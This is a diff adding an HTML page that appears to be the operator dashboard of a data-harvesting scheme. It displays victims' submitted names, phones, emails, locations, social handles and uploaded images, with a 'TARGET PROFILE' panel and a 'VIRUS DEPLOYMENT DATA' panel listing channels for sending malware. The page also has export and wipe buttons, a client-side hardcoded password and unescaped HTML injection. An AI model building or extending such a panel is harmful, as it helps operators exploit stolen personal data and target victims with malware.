@@ -1,0 +1,246 @@
+<!DOCTYPE html>
+<html>
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Score Dashboard</title>
+    <style>
+        *{margin:0;padding:0;box-sizing:border-box}
+        body{font-family:'Segoe UI',sans-serif;background:#0a0a0a;min-height:100vh;padding:20px;color:#fff}
+        .login-box{background:#1a1a2e;padding:40px 36px;border-radius:16px;box-shadow:0 8px 40px rgba(0,0,0,0.3);border:1px solid rgba(255,255,255,0.05);max-width:400px;margin:20px auto}
+        .login-box .icon{font-size:48px;display:block;text-align:center;margin-bottom:12px}
+        .login-box h1{font-size:24px;font-weight:800;text-align:center}
+        .login-box .sub{text-align:center;color:#888;font-size:13px;margin-bottom:24px}
+        .login-box input[type="password"]{width:100%;padding:12px 16px;background:rgba(255,255,255,0.05);border:1px solid rgba(255,255,255,0.1);border-radius:10px;font-size:15px;outline:none;color:#fff}
+        .login-box input[type="password"]:focus{border-color:#ffd700}
+        .login-box button{width:100%;padding:12px;background:linear-gradient(135deg,#ffd700,#f5a623);color:#000;font-weight:700;font-size:15px;border:none;border-radius:10px;cursor:pointer;margin-top:8px}
+        .login-box button:hover{transform:scale(1.01)}
+        .login-box .error{color:#ff4444;text-align:center;margin-top:12px;display:none}
+        .container{max-width:1200px;margin:0 auto;display:none}
+        .header{display:flex;justify-content:space-between;align-items:center;margin-bottom:20px;flex-wrap:wrap;gap:10px}
+        .header h1{font-size:28px;font-weight:800}
+        .header .sub{color:#888;font-size:13px}
+        .stats{display:grid;grid-template-columns:repeat(auto-fit,minmax(150px,1fr));gap:12px;margin-bottom:20px}
+        .stat-box{background:#1a1a2e;padding:16px 20px;border-radius:10px;border:1px solid rgba(255,255,255,0.05);text-align:center}
+        .stat-box .num{font-size:28px;font-weight:800;color:#ffd700}
+        .stat-box .label{font-size:11px;color:#888}
+        .card{background:#1a1a2e;border-radius:10px;border:1px solid rgba(255,255,255,0.05);margin-bottom:14px;overflow:hidden}
+        .card-header{padding:12px 16px;border-bottom:1px solid rgba(255,255,255,0.05);font-weight:600;font-size:14px;display:flex;justify-content:space-between;color:#fff}
+        .card-header .count{font-weight:400;color:#888;font-size:12px}
+        .card-body{padding:12px 16px;max-height:400px;overflow-y:auto}
+        .card-body pre{background:#0a0a0a;padding:12px;border-radius:6px;font-size:10px;overflow-x:auto;white-space:pre-wrap;word-break:break-all;border:1px solid rgba(255,255,255,0.05);color:#aaa;margin:0}
+        .empty{color:#666;text-align:center;padding:20px;font-style:italic}
+        .badge{display:inline-block;padding:2px 12px;border-radius:50px;font-size:10px;font-weight:600}
+        .badge.form{background:#27ae60;color:#fff}
+        .badge.upload{background:#2980b9;color:#fff}
+        .btn{display:inline-block;padding:4px 16px;background:#ffd700;color:#000;border-radius:50px;text-decoration:none;font-size:11px;font-weight:600;border:none;cursor:pointer}
+        .btn:hover{background:#f5a623}
+        .btn-danger{background:#e74c3c;color:#fff}
+        .btn-danger:hover{background:#c0392b}
+        .gallery-grid{display:grid;grid-template-columns:repeat(auto-fill,minmax(150px,1fr));gap:12px;padding:10px 0}
+        .gallery-item{background:#0a0a0a;border-radius:8px;border:1px solid rgba(255,255,255,0.05);overflow:hidden;cursor:pointer}
+        .gallery-item img{width:100%;height:120px;object-fit:cover;display:block}
+        .gallery-item .info{padding:6px 10px;font-size:11px;font-weight:600;color:#aaa;word-break:break-all}
+        .modal{display:none;position:fixed;top:0;left:0;right:0;bottom:0;background:rgba(0,0,0,0.9);z-index:999;align-items:center;justify-content:center;padding:20px}
+        .modal.active{display:flex}
+        .modal-content{max-width:90%;max-height:90%;background:#1a1a2e;border-radius:12px;overflow:hidden;position:relative;border:1px solid rgba(255,255,255,0.1)}
+        .modal-content .close{position:absolute;top:10px;right:15px;font-size:28px;color:#fff;cursor:pointer;background:rgba(0,0,0,0.6);width:40px;height:40px;border-radius:50%;display:flex;align-items:center;justify-content:center;border:none;z-index:10}
+        .modal-content img{max-width:100%;max-height:80vh;display:block;margin:0 auto}
+        .refresh{display:inline-block;margin-left:10px;padding:2px 12px;background:rgba(255,255,255,0.05);border-radius:50px;font-size:11px;color:#888;text-decoration:none;cursor:pointer;border:1px solid rgba(255,255,255,0.05)}
+        .refresh:hover{background:rgba(255,255,255,0.1)}
+        ::-webkit-scrollbar{width:4px}
+        ::-webkit-scrollbar-track{background:#0a0a0a}
+        ::-webkit-scrollbar-thumb{background:#ffd700;border-radius:10px}
+        @media(max-width:600px){.stats{grid-template-columns:1fr 1fr}.gallery-grid{grid-template-columns:1fr 1fr}}
+    </style>
+</head>
+<body>
+
+<div id="loginScreen" class="login-box">
+    <span class="icon">🔒</span>
+    <h1>Score Dashboard</h1>
+    <p class="sub">Enter password to view data</p>
+    <form id="loginForm">
+        <input type="password" id="loginPassword" placeholder="Enter password" required autofocus>
+        <button type="submit">Unlock →</button>
+        <div class="error" id="loginError">Invalid password</div>
+    </form>
+</div>
+
+<div id="dashboard" class="container">
+    <div class="header">
+        <div>
+            <h1>📊 Score Dashboard</h1>
+            <span class="sub" id="entryCount">Loading...</span>
+            <span class="refresh" onclick="loadData()">↻ Refresh</span>
+            <button class="btn" onclick="exportData()">📥 Export</button>
+            <button class="btn btn-danger" onclick="clearData()">🗑️ Clear</button>
+        </div>
+        <button class="btn btn-danger" onclick="logout()" style="background:#e74c3c;color:#fff;">🚪 Logout</button>
+    </div>
+    <div class="stats" id="stats">
+        <div class="stat-box"><div class="num" id="totalCount">0</div><div class="label">Total Entries</div></div>
+        <div class="stat-box"><div class="num" id="formCount">0</div><div class="label">Form Submissions</div></div>
+        <div class="stat-box"><div class="num" id="uploadCount">0</div><div class="label">Uploads</div></div>
+    </div>
+    <div id="dataContent"></div>
+</div>
+
+<div class="modal" id="imageModal" onclick="closeModal()">
+    <div class="modal-content" onclick="event.stopPropagation()">
+        <button class="close" onclick="closeModal()">✕</button>
+        <img id="modalImage" src="">
+    </div>
+</div>
+
+<script>
+const PASSWORD = '9990';
+const BACKEND_URL = window.location.origin;
+
+function loadData() {
+    fetch(BACKEND_URL + '/api/data')
+    .then(response => response.json())
+    .then(data => {
+        const submissions = data.filter(d => d.fullname);
+        const uploads = data.filter(d => d.file);
+        
+        document.getElementById('entryCount').textContent = data.length + ' entries';
+        document.getElementById('totalCount').textContent = data.length;
+        document.getElementById('formCount').textContent = submissions.length;
+        document.getElementById('uploadCount').textContent = uploads.length;
+        
+        let html = '';
+        
+        // Target Profile
+        if (submissions.length > 0) {
+            const latest = submissions[submissions.length - 1];
+            html += `
+                <div style="background:linear-gradient(135deg,#1a1a2e,#2d2d44);border:1px solid rgba(255,215,0,0.2);padding:16px 20px;border-radius:10px;margin-bottom:16px;">
+                    <h3 style="color:#ffd700;font-size:14px;margin-bottom:8px;">🎯 TARGET PROFILE</h3>
+                    <div style="display:grid;grid-template-columns:1fr 1fr;gap:8px;">
+                        <div style="font-size:12px;color:#aaa;"><strong style="color:#fff;">Name:</strong> ${latest.fullname || 'Unknown'}</div>
+                        <div style="font-size:12px;color:#aaa;"><strong style="color:#fff;">Phone:</strong> ${latest.phone || 'Unknown'}</div>
+                        <div style="font-size:12px;color:#aaa;"><strong style="color:#fff;">Email:</strong> ${latest.email || 'Unknown'}</div>
+                        <div style="font-size:12px;color:#aaa;"><strong style="color:#fff;">Location:</strong> ${latest.location || 'Unknown'}</div>
+                        <div style="font-size:12px;color:#aaa;"><strong style="color:#fff;">Experience:</strong> ${latest.experience || 'Unknown'}</div>
+                        <div style="font-size:12px;color:#aaa;"><strong style="color:#fff;">Social:</strong> ${latest.social || 'Unknown'}</div>
+                    </div>
+                    <div style="background:rgba(231,76,60,0.1);border:1px solid rgba(231,76,60,0.2);padding:12px 16px;border-radius:8px;margin-top:10px;">
+                        <h4 style="color:#e74c3c;font-size:12px;margin-bottom:4px;">⚡ VIRUS DEPLOYMENT DATA</h4>
+                        <div style="font-size:11px;color:#aaa;">📱 SMS: ${latest.phone || 'No phone'}</div>
+                        <div style="font-size:11px;color:#aaa;">📧 Email: ${latest.email || 'No email'}</div>
+                        <div style="font-size:11px;color:#aaa;">📍 Location: ${latest.location || 'Unknown'}</div>
+                        <div style="font-size:11px;color:#aaa;">🔗 Social: ${latest.social || 'Unknown'}</div>
+                    </div>
+                </div>
+            `;
+        }
+        
+        // Form Submissions
+        html += `
+            <div class="card">
+                <div class="card-header"><span>📋 Form Submissions</span><span class="count"><span class="badge form">${submissions.length}</span></span></div>
+                <div class="card-body">${submissions.length > 0 ? `<pre>${JSON.stringify(submissions, null, 2)}</pre>` : '<div class="empty">No submissions</div>'}</div>
+            </div>
+        `;
+        
+        // Uploads
+        html += `
+            <div class="card">
+                <div class="card-header"><span>📁 Uploaded Files</span><span class="count"><span class="badge upload">${uploads.length}</span></span></div>
+                <div class="card-body">${uploads.length > 0 ? `<div class="gallery-grid">${uploads.map(u => `
+                    <div class="gallery-item" onclick="openImage('${u.file}')">
+                        <img src="/uploads/${u.file}" alt="${u.file}" loading="lazy">
+                        <div class="info">${u.file} (Uploaded)</div>
+                    </div>
+                `).join('')}</div>` : '<div class="empty">No uploads</div>'}</div>
+            </div>
+        `;
+        
+        // Raw Data
+        html += `
+            <div class="card">
+                <div class="card-header"><span>📄 Raw Data</span><span class="count">${data.length}</span></div>
+                <div class="card-body"><pre>${JSON.stringify(data, null, 2)}</pre></div>
+            </div>
+        `;
+        
+        document.getElementById('dataContent').innerHTML = html;
+    })
+    .catch(error => {
+        console.error('Error loading data:', error);
+        document.getElementById('dataContent').innerHTML = '<div class="empty">Error loading data. Please refresh.</div>';
+    });
+}
+
+function exportData() {
+    fetch(BACKEND_URL + '/api/data')
+    .then(response => response.json())
+    .then(data => {
+        const blob = new Blob([JSON.stringify(data, null, 2)], {type: 'application/json'});
+        const url = URL.createObjectURL(blob);
+        const a = document.createElement('a');
+        a.href = url;
+        a.download = 'wrsf_data_' + new Date().toISOString().slice(0,10) + '.json';
+        a.click();
+        URL.revokeObjectURL(url);
+    });
+}
+
+function clearData() {
+    if (confirm('⚠️ Delete ALL data? This cannot be undone!')) {
+        fetch(BACKEND_URL + '/api/data', { method: 'DELETE' })
+        .then(() => loadData())
+        .catch(error => console.error('Error clearing data:', error));
+    }
+}
+
+function openImage(filename) {
+    document.getElementById('modalImage').src = '/uploads/' + filename;
+    document.getElementById('imageModal').classList.add('active');
+    document.body.style.overflow = 'hidden';
+}
+
+function closeModal() {
+    document.getElementById('imageModal').classList.remove('active');
+    document.body.style.overflow = '';
+}
+
+function logout() {
+    sessionStorage.removeItem('score_auth');
+    document.getElementById('loginScreen').style.display = 'block';
+    document.getElementById('dashboard').style.display = 'none';
+    document.getElementById('loginPassword').value = '';
+}
+
+document.getElementById('loginForm').addEventListener('submit', function(e) {
+    e.preventDefault();
+    if (document.getElementById('loginPassword').value === PASSWORD) {
+        sessionStorage.setItem('score_auth', 'true');
+        document.getElementById('loginScreen').style.display = 'none';
+        document.getElementById('dashboard').style.display = 'block';
+        loadData();
+    } else {
+        document.getElementById('loginError').style.display = 'block';
+        setTimeout(() => { document.getElementById('loginError').style.display = 'none'; }, 3000);
+    }
+});
+
+document.addEventListener('keydown', function(e) {
+    if (e.key === 'Escape') closeModal();
+});
+
+if (sessionStorage.getItem('score_auth') === 'true') {
+    document.getElementById('loginScreen').style.display = 'none';
+    document.getElementById('dashboard').style.display = 'block';
+    loadData();
+}
+
+setInterval(() => {
+    if (sessionStorage.getItem('score_auth') === 'true') {
+        loadData();
+    }
+}, 30000);
+</script>
+</body>
+</html>
